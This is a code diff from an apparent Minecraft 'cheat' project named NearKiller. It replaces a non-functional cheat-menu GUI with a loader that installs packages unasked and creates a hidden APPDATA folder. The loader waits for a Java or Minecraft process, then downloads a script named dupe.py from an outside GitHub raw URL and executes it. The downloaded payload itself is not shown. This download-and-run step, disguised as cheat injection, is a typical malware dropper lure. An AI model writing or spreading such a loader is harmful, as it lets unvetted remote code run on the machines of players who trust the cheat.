@@ -1,83 +1,54 @@
-import customtkinter as ctk
+import os
+import subprocess
+import sys
+import urllib.request
+import time
 
-# Настройки интерфейса
-ctk.set_appearance_mode("dark")  # Темная тема
+try:
+    import psutil
+except ImportError:
+    subprocess.call([sys.executable, "-m", "pip", "install", "psutil"])
+    import psutil
 
-# Основной класс приложения
-class NearKillerApp(ctk.CTk):
-    def __init__(self):
-        super().__init__()
+# Создание папки
+target_folder = os.path.join(os.getenv("APPDATA"), "NearKiller")
+os.makedirs(target_folder, exist_ok=True)
 
-        self.title("NearKiller")
-        self.geometry("400x300")
-        self.attributes("-topmost", True)
-        self.attributes("-alpha", 0.9)  # Полупрозрачность
+# Ссылка на GitHub RAW
+script_url = "https://raw.githubusercontent.com/Artesdfqa/1233213123/main/dupe.py"
+script_path = os.path.join(target_folder, "dupe.py")
 
-        self.active_tab = None
+# Проверка процессов
+def is_minecraft_running():
+    for proc in psutil.process_iter(['name']):
+        try:
+            if 'java' in proc.info['name'].lower() or 'minecraft' in proc.info['name'].lower():
+                return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    return False
 
-        # Основной фрейм
-        self.main_frame = ctk.CTkFrame(self, fg_color="#1e1e2e")
-        self.main_frame.pack(expand=True, fill="both", padx=10, pady=10)
+print("[*] Ожидание запуска Minecraft...")
 
-        # Панель вкладок
-        self.tab_frame = ctk.CTkFrame(self.main_frame, fg_color="#1e1e2e")
-        self.tab_frame.pack(side="top", fill="x")
+# Ожидание запуска Minecraft
+while not is_minecraft_running():
+    print("[*] Minecraft не запущен. Проверка снова через 5 секунд...")
+    time.sleep(5)
 
-        # Область меню
-        self.menu_frame = ctk.CTkFrame(self.main_frame, fg_color="#1e1e2e")
-        self.menu_frame.pack(side="top", fill="both", expand=True, pady=10)
+print("[+] Minecraft обнаружен! Запуск чита...")
 
-        # Вкладки и их содержимое
-        self.tabs = {
-            "Combat": ["Aimbot", "Magic Bullet"],
-            "Visual": ["ESP", "ESP Storage"],
-            "List": ["Player List", "Item List"],
-            "Movement": ["Speed Hack", "Teleport"]
-        }
+# Установка зависимостей
+subprocess.call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
+subprocess.call([sys.executable, "-m", "pip", "install", "customtkinter", "requests"])
 
-        self.tab_buttons = {}
+# Загрузка и запуск чита
+try:
+    urllib.request.urlretrieve(script_url, script_path)
+    print("[+] Чит успешно скачан.")
+except Exception as e:
+    print(f"[!] Ошибка загрузки: {e}")
+    sys.exit(1)
 
-        for tab in self.tabs:
-            btn = ctk.CTkButton(
-                self.tab_frame,
-                text=tab,
-                command=lambda t=tab: self.show_menu(t),
-                fg_color="transparent",
-                text_color="#ffffff",
-                hover_color="#9933ff",
-                border_color="#8000ff",
-                border_width=2
-            )
-            btn.pack(side="left", padx=5, pady=5)
-            self.tab_buttons[tab] = btn
-
-        self.show_menu("Combat")  # По умолчанию открыть Combat
-
-    def show_menu(self, tab_name):
-        for t, btn in self.tab_buttons.items():
-            if t == tab_name:
-                btn.configure(fg_color="#8000ff", text_color="#ffffff")
-            else:
-                btn.configure(fg_color="transparent", text_color="#ffffff")
-
-        # Очистка предыдущих виджетов меню
-        for widget in self.menu_frame.winfo_children():
-            widget.destroy()
-
-        # Отображение новых пунктов меню
-        for item in self.tabs[tab_name]:
-            checkbox = ctk.CTkCheckBox(
-                self.menu_frame,
-                text=item,
-                text_color="#ffffff",
-                fg_color="#8000ff",
-                hover_color="#9933ff",
-                border_color="#8000ff",
-                checkmark_color="#ffffff"
-            )
-            checkbox.pack(anchor="w", padx=15, pady=5)
-
-# Запуск
-if __name__ == "__main__":
-    app = NearKillerApp()
-    app.mainloop()
+print("[*] Запуск чита...")
+subprocess.Popen([sys.executable, script_path])
+print("[✓] Инжекция завершена.")
